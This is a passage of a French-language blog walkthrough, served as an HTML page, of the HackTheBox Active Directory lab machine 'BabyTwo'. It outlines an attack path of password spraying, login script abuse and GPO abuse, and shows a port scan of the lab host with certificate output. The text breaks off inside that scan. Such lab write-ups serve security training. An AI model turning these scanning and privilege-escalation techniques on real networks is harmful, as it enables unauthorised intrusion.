@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>BabyTwo - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/babytwo/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="BabyTwo">
+  <meta property="og:description" content="BabyTwo est une machine Windows de difficulté intermédiaire évoluant dans un environnement Active Directory. L’accès initial est obtenu par devinette de mots de passe et par l’exploitation des scripts de connexion Windows. L’élévation de privilèges est réalisée en abusant de listes de contrôle d’accès (ACL) mal configurées et de stratégies de groupe (GPO).
+Énumération Nmap Le scan révèle des ports semblant appartenir à un contrôleur de domaine : DNS (53), Kerberos (88), LDAP (389 et 636), ainsi que d’autres ports Windows : SMB (445), RDP (3389).">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-27T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-27T10:28:41+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="Login Script Abuse">
+    <meta property="article:tag" content="GPO Abuse">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="BabyTwo">
+  <meta name="twitter:description" content="BabyTwo est une machine Windows de difficulté intermédiaire évoluant dans un environnement Active Directory. L’accès initial est obtenu par devinette de mots de passe et par l’exploitation des scripts de connexion Windows. L’élévation de privilèges est réalisée en abusant de listes de contrôle d’accès (ACL) mal configurées et de stratégies de groupe (GPO).
+Énumération Nmap Le scan révèle des ports semblant appartenir à un contrôleur de domaine : DNS (53), Kerberos (88), LDAP (389 et 636), ainsi que d’autres ports Windows : SMB (445), RDP (3389).">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/babytwo/" /><link rel="prev" href="http://localhost:1313/breach/" /><link rel="next" href="http://localhost:1313/intercept/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "BabyTwo",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/babytwo\/"
+        },"genre": "posts","keywords": "Medium, Windows, Active Directory, Login script abuse, GPO Abuse","wordcount":  2976 ,
+        "url": "http:\/\/localhost:1313\/babytwo\/","datePublished": "2025-12-27T10:28:41+00:00","dateModified": "2025-12-27T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">BabyTwo</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-27">2025-12-27</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2976 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#énumération">Énumération</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#smb---tcp-445">SMB - TCP 445</a>
+          <ul>
+            <li><a href="#énumération-de-partages">Énumération de partages</a></li>
+            <li><a href="#rid-brute">RID Brute</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-ameliagriffiths">Shell en tant que Amelia.Griffiths</a>
+      <ul>
+        <li><a href="#password-spraying">Password spraying</a></li>
+        <li><a href="#login-script-abuse">Login script abuse</a></li>
+        <li><a href="#shell">Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-en-tant-que-gpoadm">Shell en tant que GPOADM</a>
+      <ul>
+        <li><a href="#bloodhound">Bloodhound</a></li>
+        <li><a href="#gpo-abuse">GPO Abuse</a></li>
+        <li><a href="#shell-1">Shell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/BabyTwo/babytwo.png"
+        data-srcset="/images/BabyTwo/babytwo.png, /images/BabyTwo/babytwo.png 1.5x, /images/BabyTwo/babytwo.png 2x"
+        data-sizes="auto"
+        alt="/images/BabyTwo/babytwo.png"
+        title="BabyTwo" width="683" height="307" /></p>
+<p><strong>BabyTwo</strong> est une machine Windows de difficulté intermédiaire évoluant dans un environnement <strong>Active Directory</strong>.  L’accès initial est obtenu par <strong>devinette de mots de passe</strong> et par l’<strong>exploitation des scripts de connexion Windows</strong>.  L’élévation de privilèges est réalisée en abusant de <strong>listes de contrôle d’accès (ACL) mal configurées</strong> et de <strong>stratégies de groupe (GPO)</strong>.</p>
+<h1 id="énumération">Énumération</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Le scan révèle des ports semblant appartenir à un contrôleur de domaine : DNS (<code>53</code>), Kerberos (<code>88</code>), LDAP (<code>389</code> et <code>636</code>), ainsi que d&rsquo;autres ports Windows : SMB (<code>445</code>), RDP (<code>3389</code>).</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/workspace/BabyTwo
+</span></span><span class="line"><span class="cl">❯ rustscan -a 10.129.234.72 -- -A -oN fulltcpscan.txt
+</span></span><span class="line"><span class="cl">--snip--
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        syn-ack ttl <span class="m">127</span> Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  syn-ack ttl <span class="m">127</span> Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-12-23 20:53:02Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   syn-ack ttl <span class="m">127</span> Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: baby2.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>baby2-CA/domainComponent<span class="o">=</span>baby2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2105-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   4ef7774ca9798d43b332cc537cb641ab
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
+</span></span><span class="line"><span class="cl"><span class="p">|</span> usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
+</span></span><span class="line"><span class="cl"><span class="p">|</span> y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
+</span></span><span class="line"><span class="cl"><span class="p">|</span> PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
+</span></span><span class="line"><span class="cl"><span class="p">|</span> b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
+</span></span><span class="line"><span class="cl"><span class="p">|</span> C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
+</span></span><span class="line"><span class="cl"><span class="p">|</span> G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
+</span></span><span class="line"><span class="cl"><span class="p">|</span> +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">Fg</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds? syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?     syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    syn-ack ttl <span class="m">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: baby2.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>baby2-CA/domainComponent<span class="o">=</span>baby2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2105-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   4ef7774ca9798d43b332cc537cb641ab
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
+</span></span><span class="line"><span class="cl"><span class="p">|</span> usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
+</span></span><span class="line"><span class="cl"><span class="p">|</span> y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 1KsIkfuJAgMBAAGjggL+MIIC+jA4BgkrBgEEAYI3FQcEKzApBiErBgEEAYI3FQiF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 4spth//+O4T9nzqEtYddhL3WT4FsASECAW4CAQAwMgYDVR0lBCswKQYIKwYBBQUH
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQEAwIF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> oDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwGCisG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUCXtEkncgNYDkF718E9YVgVB3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 9TowHwYDVR0jBBgwFoAU8X4t8lmHLtgllIV37OYMM3rlCggwgcEGA1UdHwSBuTCB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049YmFieTItQ0EoMSksQ049ZGMsQ049Q0RQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Z3VyYXRpb24sREM9YmFieTIsREM9dmw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG3BggrBgEF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BQcBAQSBqjCBpzCBpAYIKwYBBQUHMAKGgZdsZGFwOi8vL0NOPWJhYnkyLUNBLENO
+</span></span><span class="line"><span class="cl"><span class="p">|</span> PUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
+</span></span><span class="line"><span class="cl"><span class="p">|</span> b25maWd1cmF0aW9uLERDPWJhYnkyLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9v
+</span></span><span class="line"><span class="cl"><span class="p">|</span> YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MCoGA1UdEQEB/wQgMB6C
+</span></span><span class="line"><span class="cl"><span class="p">|</span> C2RjLmJhYnkyLnZsgghiYWJ5Mi52bIIFQkFCWTIwTgYJKwYBBAGCNxkCBEEwP6A9
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTIxMzI0Mzk1OC0xNzY2MjU5NjIwLTQy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NzY5NzYyNjctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAZcjNnVAZdPRyGGRqc+Ik
+</span></span><span class="line"><span class="cl"><span class="p">|</span> G6uvFUfS2h+UL8gPUvubcxFvKOsLH1l8zA/3/ouaB0mCqNsccE7kAeZ0VeSj3k+z
+</span></span><span class="line"><span class="cl"><span class="p">|</span> +oOLyPhRhyJgh8ZO26X2iaJPInGooTAP7GekWOet4yeFrzmLJ4y4Hs/nZh1kYED+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> KxY5gr4mkn9BxDGqi9E+C82bY+wT9YlonabfwQsXfIsoLs2edKLFmL9YPxA5AYkG
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UDr5+/D1sTb/ZJJ5Vuv/bqPqA+d4KxLfadbbeRoQtqQCbmZAnvdm8yezF4UU+t0J
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 21lG42LN+VtpTRdVFGbEq5iY448J+cHTYfK8euA6L4w9IqAdkDL1SjHO3hiWwgtb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">Fg</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          syn-ack ttl <span class="m">127</span> Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: baby2.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>baby2-CA/domainComponent<span class="o">=</span>baby2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2105-08-19T14:22:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   4ef7774ca9798d43b332cc537cb641ab
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 6cfd3491aa6c413152e2f61e361fb3325eec47ff
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIFzTCCBLWgAwIBAgITPAAAAAhU+HThTaPQygABAAAACDANBgkqhkiG9w0BAQsF
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ADA+MRIwEAYKCZImiZPyLGQBGRYCdmwxFTATBgoJkiaJk/IsZAEZFgViYWJ5MjER
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MA8GA1UEAxMIYmFieTItQ0EwIBcNMjUwODE5MTQyMjExWhgPMjEwNTA4MTkxNDIy
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MTFaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDtID+m7KPkEBiQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AoNhg+PTMgYGKjCM1nzLEB6DjOuYx6NAqQo5K7q7rwFfuOafbI1Ut9HtpQWGV3wU
+</span></span><span class="line"><span class="cl"><span class="p">|</span> usZj3gLS2Au+3TiEXgyg1mJL/Sitt9dHJ+18TVeUcrkiW3kI58Kxe1JrxqdZTtRQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span> k28JUYw/VaX0Rgqgy7HTqJvDwDeUgTrzLGMAH98LV1pm+Ufnxw8kEKTGzT3lrHPY
+</span></span><span class="line"><span class="cl"><span class="p">|</span> y7fq7xemTHbQ7TtFSZ7TAS5uyus2IPU6oT3pS3z7+u7iohEtaSPGrQksKAY+MWBk
+</span></span><span class="line"><span class="cl"><span class="p">|</span> hO76jGN2VPiRHYCmL0Cy+QbH6Pz+d/K0gnm6BAsTltkcBfSgOozOUzMNLmnhUCi8
